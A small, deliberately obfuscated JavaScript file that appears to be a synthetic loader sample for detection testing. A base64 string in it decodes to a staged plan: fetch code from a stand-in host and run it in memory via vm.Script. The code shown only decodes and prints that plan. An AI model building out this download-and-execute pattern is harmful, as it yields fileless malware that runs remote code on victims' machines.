const moduleShape = Object.freeze({ format: "commonjs" });
const Material_03408957 = "dj0xfHN0ZXBzPWFjcXVpcmVfcmVtb3RlLGRpc3BhdGNoX21lbW9yeXxhZGFwdGVyPWZldGNoX3RoZW5fZnVuY3Rpb258c3RhZ2VfY291bnQ9MXxjYW1wYWlnbl9pZD1OT0RFLTM0NTlGQkQwfHVybD1odHRwczovL25vZGUtMzQ1OWZiZDBkYzM0LmV4YW1wbGUuaW52YWxpZC9hcGl8dXNlcl9hZ2VudD1Ob2RlQXVkaXQvMzQ1OQ==";
const Codec_03408957 = "base64_chunks|identity|";

function load_03408957() { return [...Buffer.from(Material_03408957, "base64")]; }
function decode_03408957(EnCoDeD) { return [...EnCoDeD]; }
async function recover_03408957() {
  const NeUtRaL = 2 > 1 ? "left" : "right";
  const EnCoDeD = load_03408957(); let DeCoDeD = [];
  const decodeTarget = decode_03408957; DeCoDeD = decodeTarget(EnCoDeD);
  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
}
async function inspect_03408957() { return (await recover_03408957()).split("|").join("|"); }
async function plan_03408957() { const inspect = inspect_03408957; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "fetch_then_function", url: fields.url, dispatch: "vm.Script" }); }
void moduleShape; void plan_03408957;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_03408957());
